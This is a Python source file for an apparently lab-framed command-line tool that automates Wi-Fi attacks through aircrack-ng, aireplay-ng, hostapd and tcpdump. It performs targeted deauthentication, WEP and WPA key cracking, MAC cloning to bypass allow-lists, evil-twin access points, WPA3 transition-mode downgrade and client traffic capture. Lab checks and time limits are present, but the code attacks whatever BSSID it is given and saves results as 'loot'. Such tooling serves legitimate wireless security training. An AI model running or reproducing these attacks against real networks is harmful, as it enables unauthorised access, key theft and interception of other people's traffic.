"""Run the Wi-Fi Part 1 exercises against one explicitly selected lab AP."""

import argparse
import fcntl
import json
import os
import re
import secrets
import shlex
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from contextlib import ExitStack, contextmanager
from getpass import getpass
from pathlib import Path

from james.core.net_guard import NetworkGuard
from james.layers.native import NativeLayer
from james.tools.wifi import AircrackSuite, interface_name, radio_address

EXERCISES = {
    "sniff": "Capture frames and list stations on the lab AP",
    "hidden": "Observe a hidden SSID in a lab client's association traffic",
    "mac-filter": "Compare association before and after cloning the lab client's MAC",
    "wep-replay": "Test WEP shared-key authentication with a captured keystream",
    "wep": "Collect WEP IVs with optional ARP replay and test key recovery",
    "wpa": "Capture and verify WPA/WPA2-Personal, with optional wordlist recovery",
    "twin": "Capture the lab client's WPA2 authentication attempt on a second AP",
    "wpa3": "Identify SAE-only or transition mode and test the WPA2 path",
    "traffic": "Capture the lab client's traffic on a WPA2 AP on a lab bridge",
}
_PSK_AKMS = {2, 4, 6}
_SAE_AKMS = {8, 9}


class EvidenceMissing(RuntimeError):
    """The exercise ran, but its expected evidence did not appear."""


def _wpa3_mode(lines: list[str]) -> str:
    akms = [
        {int(value) for value in line.strip().split(",") if value.isdecimal()} for line in lines
    ]
    if any(types & _PSK_AKMS and types & _SAE_AKMS for types in akms):
        return "transition"
    sae = any(types & _SAE_AKMS for types in akms)
    psk = any(types & _PSK_AKMS for types in akms)
    if sae and not psk:
        return "sae"
    if psk and not sae:
        return "psk"
    return "unknown"


def _frequency(channel: int) -> int:
    return 2484 if channel == 14 else 2407 + 5 * channel


class WifiLab:
    def __init__(self, args: argparse.Namespace, directory: Path):
        self.args = args
        self.directory = directory
        self.layer = NativeLayer()
        self.aircrack = AircrackSuite(self.layer)
        self.guard = NetworkGuard()
        self.report = {
            "exercise": args.exercise,
            "bssid": args.bssid,
            "channel": args.channel,
            "interface": args.interface,
            "output_dir": str(directory),
        }
        self.cleanup_errors: list[str] = []

    def _run(self, *args: str, timeout: int = 10, check: bool = True):
        result = self.layer.run(
            shlex.join(args), timeout=timeout, cwd=str(self.directory), env={"LC_ALL": "C"}
        )
        if check and not result.success:
            detail = (result.stderr or result.stdout).strip()[-500:]
            raise RuntimeError(
                f"{args[0]} {'timed out' if result.timed_out else 'failed'}: {detail}"
            )
        return result

    def _restore(self, *args: str):
        try:
            self._run(*args)
        except (OSError, RuntimeError) as exc:
            self.cleanup_errors.append(str(exc))

    @contextmanager
    def _process(self, args: list[str], seconds: int, log: str):
        command = shlex.join(["timeout", "-s", "INT", "-k", "3s", f"{seconds}s", *args])
        output = shlex.quote(str(self.directory / log))
        process = self.layer.run_background(
            f"exec {command} >{output} 2>&1", cwd=str(self.directory), env={"LC_ALL": "C"}
        )
        try:
            yield process
        finally:
            self.layer.kill_background(process)

    @staticmethod
    def _wait(process, seconds: int, log: str) -> int:
        try:
            return process.wait(timeout=seconds + 5)
        except subprocess.TimeoutExpired as exc:
            raise RuntimeError(f"Process did not stop. See {log}.") from exc

    def _adapter_phy(self, interface: str) -> int:
        output = self._run("iw", "dev", interface, "info").stdout
        mode = re.search(r"^\s*type (\S+)", output, re.MULTILINE)
        phy = re.search(r"^\s*wiphy (\d+)", output, re.MULTILINE)
        if not mode or not phy or mode[1] != "managed":
            raise RuntimeError(f"{interface} must be a dedicated Wi-Fi adapter in managed mode")
        safe, reason = self.guard.check_monitor_safe(interface)
        if not safe:
            raise RuntimeError(reason)
        if self._run("iw", "dev", interface, "link").stdout.startswith("Connected to "):
            raise RuntimeError(
                f"Disconnect {interface} from its current network before running this exercise"
            )
        return int(phy[1])

    @contextmanager
    def _adapter(self, interface: str, *, monitor: bool = False):
        original = json.loads(self._run("ip", "-j", "link", "show", "dev", interface).stdout)[0]
        if "master" in original:
            raise RuntimeError(f"{interface} is already attached to a bridge or bond")
        with ExitStack() as cleanup:
            if shutil.which("nmcli"):
                nm = self._run(
                    "nmcli", "-g", "GENERAL.NM-MANAGED", "device", "show", interface, check=False
                )
                if nm.success and nm.stdout.strip() == "yes":
                    cleanup.callback(
                        self._restore, "nmcli", "device", "set", interface, "managed", "yes"
                    )
                    self._run("nmcli", "device", "set", interface, "managed", "no")
                elif not (nm.success and nm.stdout.strip() == "no") and nm.returncode != 8:
                    raise RuntimeError(f"Cannot determine NetworkManager ownership of {interface}")
            cleanup.callback(
                self._restore,
                "ip",
                "link",
                "set",
                "dev",
                interface,
                "up" if "UP" in original["flags"] else "down",
            )
            cleanup.callback(
                self._restore, "ip", "link", "set", "dev", interface, "address", original["address"]
            )
            cleanup.callback(self._restore, "iw", "dev", interface, "set", "type", "managed")
            if self.args.bridge and interface == self.args.ap_interface:
                cleanup.callback(self._restore, "ip", "link", "set", "dev", interface, "nomaster")
            cleanup.callback(self._restore, "ip", "link", "set", "dev", interface, "down")
            self._run("ip", "link", "set", "dev", interface, "down")
            if monitor:
                self._run("iw", "dev", interface, "set", "type", "monitor")
            self._run("ip", "link", "set", "dev", interface, "up")
            yield original["address"].lower()

    def _csv(self, name: str) -> dict:
        path = self.directory / f"{name}-01.csv"
        return self.aircrack.parse_airodump_csv(
            path.read_text(errors="replace") if path.is_file() else ""
        )

    def _wait_for_client(self, capture, name: str):
        end = time.monotonic() + min(8, self.args.seconds / 2)
        while capture.poll() is None and time.monotonic() < end:
            if any(
                st["station_mac"] == self.args.client and st["bssid"] == self.args.bssid
                for st in self._csv(name)["stations"]
            ):
                return
            time.sleep(0.25)
        raise EvidenceMissing(
            "The specified lab client was not observed on the target AP during capture"
        )

    def _capture(self, name: str, bssid: str, seconds: int, *, action=None) -> Path:
        args = self.aircrack.airodump_args(
            self.args.interface,
            channel=self.args.channel,
            bssid=bssid,
            write_prefix=self.directory / name,
        )
        log = f"{name}.log"
        with self._process(args, seconds, log) as capture, ExitStack() as tasks:
            if action:
                action(capture, tasks)
            if self._wait(capture, seconds, log) not in {0, 124}:
                raise RuntimeError(f"Airodump failed. See {log}.")
        path = self.directory / f"{name}-01.cap"
        if not path.is_file() or path.stat().st_size <= 24:
            raise EvidenceMissing(f"No packets from {bssid} were captured. See {log}.")
        self.report["capture"] = str(path)
        return path

    def _tshark(self, capture: Path, display_filter: str, *fields: str) -> list[str]:
        args = ["tshark", "-n", "-r", str(capture), "-T", "fields"]
        if display_filter:
            args.extend(["-Y", display_filter])
        for field in fields:
            args.extend(["-e", field])
        return self._run(*args, timeout=30).stdout.splitlines()

    def _active_capture(self, name: str, *, replay: bool = False) -> Path:
        args = self.args

        def stimulate(capture, tasks):
            self._wait_for_client(capture, name)
            safe, reason = self.guard.check_deauth_safe(args.bssid)
            if not safe:
                raise RuntimeError(reason)
            if replay:
                command = [
                    "aireplay-ng",
                    "-3",
                    "-b",
                    args.bssid,
                    "-h",
                    args.client,
                    "-x",
                    "100",
                    args.interface,
                ]
                tasks.enter_context(self._process(command, args.seconds, "arp-replay.log"))
            if args.deauth:
                result = self.aircrack.deauth(
                    args.interface, args.bssid, count=5, client=args.client
                )
                if not result.success:
                    raise RuntimeError(
                        f"Targeted deauthentication failed: {(result.stderr or result.stdout).strip()[-500:]}"
                    )

        print(
            f"Capturing on {args.bssid} for {args.seconds}s. Reconnect your lab client if needed.",
            flush=True,
        )
        return self._capture(
            name, args.bssid, args.seconds, action=stimulate if args.deauth or replay else None
        )

    def _hidden(self, capture: Path):
        bssid = self.args.bssid
        scope = f"wlan.bssid == {bssid}"
        beacons = self._tshark(
            capture,
            f"{scope} && wlan.fc.type_subtype == 0x08 && wlan.tag.number == 0",
            "frame.number",
            "wlan.ssid",
        )
        hidden = any(not row.partition("\t")[2].replace(":", "").strip("0") for row in beacons)
        self.report["hidden_beacon_seen"] = hidden
        if not hidden:
            raise EvidenceMissing("No hidden beacon was observed from the lab AP")
        frames = f"{scope} && wlan.fc.type_subtype in {{0x00 0x02 0x05}} && wlan.ssid"
        if self.args.client:
            frames += f" && wlan.addr == {self.args.client}"
        for encoded in self._tshark(capture, frames, "wlan.ssid"):
            try:
                ssid = bytes.fromhex(encoded.replace(":", ""))
            except ValueError:
                continue
            if ssid.strip(b"\0"):
                self.report["revealed_ssid"] = ssid.decode(errors="replace")
                return
        raise EvidenceMissing("The SSID did not appear in association or probe-response frames")

    def _mac_filter(self, ssid: str):
        args = self.args
        iface = args.client_interface

        def associate():
            self._run(
                "iw",
                "dev",
                iface,
                "connect",
                "-w",
                ssid,
                str(_frequency(args.channel)),
                args.bssid,
                timeout=15,
                check=False,
            )
            state = self._run("iw", "dev", iface, "link").stdout.lower()
            return (
                state.splitlines()[0].split()[:3] == ["connected", "to", args.bssid]
                if state
                else False
            )

        with self._adapter(iface) as original:
            if original == args.client:
                raise RuntimeError("The test adapter already has the allow-listed MAC")
            self.report["associated_with_original_mac"] = associate()
            if self.report["associated_with_original_mac"]:
                raise EvidenceMissing("The open AP already accepts the test adapter's original MAC")
            self._run("ip", "link", "set", "dev", iface, "down")
            self._run("ip", "link", "set", "dev", iface, "address", args.client)
            self._run("ip", "link", "set", "dev", iface, "up")
            self.report["associated_with_allowlisted_mac"] = associate()
            if not self.report["associated_with_allowlisted_mac"]:
                raise EvidenceMissing(
                    "The test adapter could not associate with the allow-listed MAC"
                )

    def _crack(self, capture: Path, bssid: str, *, wep: bool = False):
        if not wep:
            if self.args.client:
                client_capture = self.directory / "client-handshake.pcap"
                display_filter = (
                    f"wlan.bssid == {bssid} && "
                    f"(wlan.addr == {self.args.client} || wlan.fc.type_subtype == 0x08)"
                )
                self._run(
                    "tshark",
                    "-n",
                    "-r",
                    str(capture),
                    "-Y",
                    display_filter,
                    "-F",
                    "pcap",
                    "-w",
                    str(client_capture),
                    timeout=30,
                )
                capture = client_capture
                self.report["handshake_capture"] = str(capture)
            prefix = self.directory / "verify"
            args = self.aircrack.handshake_args(capture, bssid, prefix)
            result = self._run(*args, timeout=30, check=False)
            proof = prefix.with_suffix(".hccapx")
            self.report["handshake_verified"] = (
                result.success and proof.is_file() and proof.stat().st_size > 0
            )
            proof.unlink(missing_ok=True)
            if not self.report["handshake_verified"]:
                if result.timed_out:
                    raise RuntimeError("Aircrack timed out verifying the capture")
                raise EvidenceMissing("Aircrack did not find a usable WPA handshake for this BSSID")
            if not self.args.wordlist:
                return

        key = self.directory / "recovered-key.txt"
        args = self.aircrack.crack_args(
            capture, bssid=bssid, wordlist=self.args.wordlist, key_file=key, wep=wep
        )
        seconds = self.args.crack_seconds
        print(f"Testing key recovery for up to {seconds}s.", flush=True)
        # Aircrack writes keys to stdout too. Keep the key only in the private key file.
        with self._process(args, seconds, os.devnull) as cracker:
            code = self._wait(cracker, seconds, "aircrack-ng")
        self.report["key_recovered"] = key.is_file() and key.stat().st_size > 0
        if not self.report["key_recovered"]:
            if code in {124, 137}:
                raise EvidenceMissing("The recovery time limit elapsed")
            if wep:
                raise EvidenceMissing("No WEP key recovered from these IVs")
            raise EvidenceMissing("No key recovered from the supplied wordlist")
        key.chmod(0o600)
        self.report["key_file"] = str(key)

    @contextmanager
    def _lab_ap(self, bssid: str, ssid: str, passphrase: str, config_dir: Path, seconds: int):
        args = self.args
        # Hex SSID avoids treating SSID contents as hostapd directives.
        acl = config_dir / "allowed-client"
        acl.write_text(f"{args.client}\n")
        config = config_dir / "hostapd.conf"
        pass_option = (
            "wpa_psk" if re.fullmatch(r"[a-fA-F0-9]{64}", passphrase) else "wpa_passphrase"
        )
        config.write_text(
            "\n".join(
                [
                    f"interface={args.ap_interface}",
                    "driver=nl80211",
                    f"bssid={bssid}",
                    f"ssid2={ssid.encode().hex()}",
                    f"country_code={args.country}",
                    "hw_mode=b" if args.channel == 14 else "hw_mode=g",
                    f"channel={args.channel}",
                    "auth_algs=1",
                    "wpa=2",
                    "wpa_key_mgmt=WPA-PSK",
                    "rsn_pairwise=CCMP",
                    "ieee80211w=0",
                    f"{pass_option}={passphrase}",
                    "macaddr_acl=1",
                    f"accept_mac_file={acl}",
                    "ap_isolate=1",
                    *([f"bridge={args.bridge}"] if args.bridge else []),
                    "",
                ]
            )
        )
        log = self.directory / "hostapd.log"
        with self._process(["hostapd", str(config)], seconds, log.name) as ap:
            deadline = time.monotonic() + 8
            while ap.poll() is None and time.monotonic() < deadline:
                if log.is_file() and "AP-ENABLED" in log.read_text(errors="replace"):
                    print(
                        f"Lab AP ready at {bssid}. Reconnect only your lab client now.", flush=True
                    )
                    yield
                    return
                time.sleep(0.2)
            raise RuntimeError("Hostapd did not enable the lab AP. See hostapd.log.")

    def _twin(self, ssid: str, *, passphrase: str | None = None):
        args = self.args
        safe, reason = self.guard.check_evil_twin_safe(args.bssid)
        if not safe:
            raise RuntimeError(reason)
        traffic = args.exercise == "traffic"
        with (
            self._adapter(args.ap_interface) as bssid,
            tempfile.TemporaryDirectory(dir=self.directory) as temp,
        ):
            if bssid in {args.bssid, args.client}:
                raise RuntimeError("The lab AP adapter must have its own MAC address")
            self.report["lab_ap_bssid"] = bssid
            config_dir = Path(temp)
            key = passphrase if traffic else secrets.token_hex(16)
            if traffic:
                capture = self.directory / "traffic.pcap"
                with self._lab_ap(bssid, ssid, key, config_dir, args.seconds + 10):
                    command = [
                        "tcpdump",
                        "-i",
                        args.ap_interface,
                        "-s",
                        "0",
                        "-U",
                        "-w",
                        str(capture),
                        "ether",
                        "host",
                        args.client,
                    ]
                    with self._process(command, args.seconds, "tcpdump.log") as sniffer:
                        if self._wait(sniffer, args.seconds, "tcpdump.log") not in {0, 124}:
                            raise RuntimeError("Traffic capture failed. See tcpdump.log.")
                self.report["capture"] = str(capture)
                self.report["client_frames"] = len(self._tshark(capture, "", "frame.number"))
                if not self.report["client_frames"]:
                    raise EvidenceMissing(
                        "No traffic from the allow-listed lab client was captured"
                    )
                return

            def start_ap(_capture, tasks):
                tasks.enter_context(self._lab_ap(bssid, ssid, key, config_dir, args.seconds + 5))

            capture = self._capture("twin", bssid, args.seconds, action=start_ap)
        self._crack(capture, bssid)

    def run(self, passphrase: str | None = None):
        args = self.args
        tools = {"ip", "iw", "timeout", "airodump-ng"}
        if args.exercise in {"wpa", "wpa3", "wep", "twin"}:
            tools.add("aircrack-ng")
        if args.deauth or args.arp_replay or args.inject_test or args.exercise == "wep-replay":
            tools.add("aireplay-ng")
        if args.exercise in {"hidden", "wpa3", "traffic", "twin"} or (
            args.exercise == "wpa" and args.client
        ):
            tools.add("tshark")
        if args.ap_interface:
            tools.add("hostapd")
        if args.exercise == "traffic":
            tools.add("tcpdump")
            if not (Path("/sys/class/net") / args.bridge / "bridge").is_dir():
                raise RuntimeError(f"Lab bridge {args.bridge} does not exist")
        missing = sorted(tool for tool in tools if not shutil.which(tool))
        if missing:
            raise RuntimeError(f"Required commands missing: {', '.join(missing)}")

        phy = self._adapter_phy(args.interface)
        second = args.ap_interface or args.client_interface
        if second and self._adapter_phy(second) == phy:
            raise RuntimeError("The second adapter must be on a different physical Wi-Fi radio")

        with self._adapter(args.interface, monitor=True) as monitor_mac:
            seconds = args.seconds if args.exercise == "sniff" and not args.inject_test else 6
            recon = self._capture("recon", args.bssid, seconds)
            survey = self._csv("recon")
            ap = next((ap for ap in survey["aps"] if ap["bssid"] == args.bssid), None)
            if not ap or ap["channel"] != args.channel:
                raise EvidenceMissing("The requested AP was not observed on the requested channel")
            self.report["ap"] = ap
            self.report["stations"] = sorted(
                {s["station_mac"] for s in survey["stations"] if s["bssid"] == args.bssid}
            )
            ssid = ap["essid"]
            privacy = set(ap["privacy"].upper().split())
            personal = (
                bool(privacy & {"WPA", "WPA2"}) and "PSK" in ap["authentication"].upper().split()
            )
            if args.exercise == "sniff":
                if args.inject_test:

                    def inject(_capture, tasks):
                        command = ["aireplay-ng", "-9", "-a", args.bssid]
                        if ssid and not ssid.startswith("<length:"):
                            command.extend(["-e", ssid])
                        tasks.enter_context(
                            self._process([*command, args.interface], args.seconds, "injection.log")
                        )

                    self._capture("injection", args.bssid, args.seconds, action=inject)
                    self.report["injection_log"] = str(self.directory / "injection.log")
                return
            if args.exercise == "hidden":
                self._hidden(self._active_capture("hidden"))
                return
            if args.exercise == "wpa3":
                beacon_filter = f"wlan.bssid == {args.bssid} && wlan.fc.type_subtype == 0x08"
                mode = _wpa3_mode(self._tshark(recon, beacon_filter, "wlan.rsn.akms.type"))
                self.report["wpa3_mode"] = mode
                if mode == "sae":
                    return
                if mode != "transition":
                    raise EvidenceMissing("No SAE/PSK transition-mode beacon was observed")
                if not args.ap_interface:
                    self._crack(self._active_capture("transition"), args.bssid)
                    return
            elif args.exercise in {"wpa", "twin", "traffic"} and not personal:
                raise EvidenceMissing("The requested AP did not advertise WPA/WPA2-Personal")

            if args.exercise in {"twin", "traffic", "wpa3", "mac-filter", "wep-replay"} and (
                not ssid or ssid.startswith("<length:")
            ):
                raise EvidenceMissing("This exercise requires a visible lab SSID")
            if args.exercise == "mac-filter":
                if "OPN" not in privacy:
                    raise EvidenceMissing("The MAC filter exercise requires an open lab AP")
                if args.client in self.report["stations"]:
                    raise EvidenceMissing(
                        "Disconnect the allow-listed lab client before cloning its MAC"
                    )
                self._mac_filter(ssid)
            elif args.exercise in {"twin", "wpa3", "traffic"}:
                self._twin(ssid, passphrase=passphrase)
            elif args.exercise == "wpa":
                self._crack(self._active_capture("wpa"), args.bssid)
            else:
                if "WEP" not in privacy:
                    raise EvidenceMissing("The requested AP did not advertise WEP")
                capture = self._active_capture("wep", replay=args.arp_replay)
                if args.exercise == "wep":
                    self._crack(capture, args.bssid, wep=True)
                else:
                    xor = next(iter(sorted(self.directory.glob("wep-*.xor"))), None)
                    if xor is None:
                        raise EvidenceMissing("No shared-key authentication keystream was captured")
                    result = self._run(
                        "aireplay-ng",
                        "-1",
                        "0",
                        "-e",
                        ssid,
                        "-a",
                        args.bssid,
                        "-h",
                        monitor_mac,
                        "-y",
                        str(xor),
                        args.interface,
                        timeout=30,
                    )
                    self.report["keystream"] = str(xor)
                    self.report["associated_via_keystream"] = (
                        "Association successful" in result.stdout
                    )
                    if not self.report["associated_via_keystream"]:
                        raise EvidenceMissing(
                            "The AP did not accept replayed shared-key authentication"
                        )


def _parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="james wifi-lab",
        description="Run one exercise against your isolated Wi-Fi lab AP.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Exercises\n"
        + "\n".join(f"  {key:<11} {value}" for key, value in EXERCISES.items()),
    )
    parser.add_argument("exercise", choices=EXERCISES)
    parser.add_argument(
        "--interface",
        required=True,
        type=interface_name,
        help="Dedicated managed-mode Wi-Fi adapter",
    )
    parser.add_argument("--bssid", required=True, type=radio_address, help="Lab AP MAC address")
    parser.add_argument("--channel", required=True, type=int, choices=range(1, 15), metavar="1-14")
    parser.add_argument(
        "--client", type=radio_address, help="Lab client's current Wi-Fi MAC address"
    )
    parser.add_argument(
        "--seconds", type=int, help="Capture window in seconds (default 30, WEP 120)"
    )
    parser.add_argument("--wordlist", type=Path, help="Local wordlist for WPA/WPA2 recovery")
    parser.add_argument(
        "--crack-seconds", type=int, default=120, help="Time limit for key recovery"
    )
    parser.add_argument(
        "--deauth", action="store_true", help="Send a single bounded burst to --client"
    )
    parser.add_argument(
        "--arp-replay", action="store_true", help="Run ARP replay with the WEP lab client"
    )
    parser.add_argument(
        "--inject-test", action="store_true", help="Run the adapter's injection test during sniff"
    )
    parser.add_argument(
        "--client-interface", type=interface_name, help="Second adapter for the MAC filter exercise"
    )
    parser.add_argument(
        "--ap-interface", type=interface_name, help="Second radio for twin, wpa3, or traffic"
    )
    parser.add_argument(
        "--country", type=str.upper, help="Regulatory country code for the second AP"
    )
    parser.add_argument(
        "--bridge", type=interface_name, help="Existing lab bridge for the traffic exercise"
    )
    parser.add_argument(
        "--key-file", type=Path, help="Use a recovered key for traffic instead of prompting"
    )
    parser.add_argument("--output-dir", type=Path, default=Path.home() / ".james/loot/wifi-lab")
    args = parser.parse_args(argv)
    if args.seconds is None:
        args.seconds = 120 if args.exercise == "wep" else 30
    if not 12 <= args.seconds <= 600 or not 1 <= args.crack_seconds <= 1800:
        parser.error("Capture must be 12–600 seconds and recovery must be 1–1800 seconds")
    if args.client == args.bssid:
        parser.error("--client and --bssid must refer to different radios")
    if args.deauth and (
        not args.client or args.exercise not in {"hidden", "wep", "wep-replay", "wpa"}
    ):
        parser.error("--deauth requires --client and hidden, wep, wep-replay, or wpa")
    if args.arp_replay and (args.exercise != "wep" or not args.client):
        parser.error("--arp-replay requires the wep exercise and --client")
    if args.inject_test and args.exercise != "sniff":
        parser.error("--inject-test applies only to sniff")
    if args.exercise == "mac-filter" and not (args.client_interface and args.client):
        parser.error("mac-filter requires --client-interface and --client")
    if args.client_interface and args.exercise != "mac-filter":
        parser.error("--client-interface applies only to mac-filter")
    if args.exercise in {"twin", "traffic"} and not args.ap_interface:
        parser.error(f"{args.exercise} requires --ap-interface")
    if args.ap_interface and (
        args.exercise not in {"twin", "traffic", "wpa3"}
        or not args.client
        or not re.fullmatch(r"[A-Z]{2}", args.country or "")
    ):
        parser.error("--ap-interface requires twin, traffic, or wpa3, with --client and --country")
    if args.interface in {args.ap_interface, args.client_interface}:
        parser.error("The second adapter must differ from --interface")
    if args.exercise == "traffic" and not args.bridge:
        parser.error("traffic requires an existing --bridge")
    if (args.bridge or args.key_file) and args.exercise != "traffic":
        parser.error("--bridge and --key-file apply only to traffic")
    if args.wordlist:
        if args.exercise not in {"wpa", "wpa3", "twin"} or not args.wordlist.is_file():
            parser.error("--wordlist must be an existing file and requires wpa, wpa3, or twin")
        args.wordlist = args.wordlist.resolve()
    return args


def _stop(_signal, _frame):
    raise KeyboardInterrupt


def main(argv: list[str]) -> int:
    args = _parse_args(argv)
    if os.geteuid() != 0:
        print("Wi-Fi Lab needs root access for radio and packet capture operations. Run with sudo.")
        return 2

    try:
        passphrase = None
        if args.exercise == "traffic":
            if not args.key_file and not sys.stdin.isatty():
                raise ValueError("Provide --key-file when running traffic without a terminal")
            passphrase = (
                args.key_file.read_text().rstrip("\r\n")
                if args.key_file
                else getpass("Lab WPA2 passphrase: ")
            )
            if not (
                re.fullmatch(r"[ -~]{8,63}", passphrase)
                or re.fullmatch(r"[a-fA-F0-9]{64}", passphrase)
            ):
                raise ValueError("Use an 8–63 character WPA2 passphrase or a 64-digit hex key")
        flags = os.O_CREAT | os.O_RDWR | os.O_NOFOLLOW
        with os.fdopen(os.open("/run/lock/james-wifi-lab.lock", flags, 0o600), "w") as lock:
            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
            args.output_dir.mkdir(parents=True, exist_ok=True)
            directory = Path(
                tempfile.mkdtemp(prefix=f"{args.exercise}-", dir=args.output_dir.resolve())
            )
            lab = WifiLab(args, directory)
            previous = signal.signal(signal.SIGTERM, _stop)
            try:
                lab.run(passphrase)
                status, code = "observed", 0
            except EvidenceMissing as exc:
                status, code = "not_observed", 1
                lab.report["reason"] = str(exc)
            except (RuntimeError, OSError, ValueError) as exc:
                status, code = "error", 2
                lab.report["reason"] = str(exc)
            except KeyboardInterrupt:
                status, code = "interrupted", 130
            finally:
                signal.signal(signal.SIGTERM, previous)
            if lab.cleanup_errors:
                lab.report["cleanup_errors"] = lab.cleanup_errors
                status, code = "cleanup_error", 2
            lab.report["status"] = status
            output = json.dumps(lab.report, indent=2)
            (directory / "report.json").write_text(output + "\n")
            print(output)
            return code
    except BlockingIOError:
        print("Another Wi-Fi Lab exercise is running.")
        return 2
    except (OSError, ValueError, EOFError) as exc:
        print(f"Wi-Fi Lab setup failed: {exc}")
        return 2
    except KeyboardInterrupt:
        return 130
